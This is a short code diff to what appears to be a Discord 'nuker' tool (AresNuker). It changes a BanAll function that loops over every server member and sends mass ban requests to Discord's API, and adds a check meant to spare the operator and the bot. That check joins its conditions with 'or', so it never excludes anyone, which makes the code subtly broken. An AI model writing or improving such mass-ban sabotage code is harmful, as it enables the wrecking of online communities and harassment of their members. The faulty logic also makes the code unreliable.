@@ -3,6 +3,7 @@ import global_vars, requests, json
 from .requests_maker import GetQ
 from AresNuker import Console
 from .channels import GetChannels
+from .create_invite import GetBotId
 
 console = Console()
 q = GetQ()
@@ -58,11 +59,11 @@ def SendMessage() -> None:
 def BanAll() -> None:
 	payload = {'delete_message_days':'0', 'reason': config['nuke']['ban_reason']}
 	members = GetGuildMembers(guild_id=guild_id)
+	bot_id = GetBotId()
 	for member in members:
-		if member != config['discord']['user_id']:
+		if member['id'] != config['discord']['user_id'] or member['id'] != str(bot_id):
 			try:
 				q.put((requests.put, f'https://discord.com/api/v8/guilds/{guild_id}/bans/{member["id"]}', headers, payload))
-				console.log(f'Baned {member["name"]}')
+				console.log(f'Baned → {member["name"]}')
 			except:
-				console.error(f'Unble to ban {member["name"]}')
-
+				console.error(f'Unble to ban → {member["name"]}')
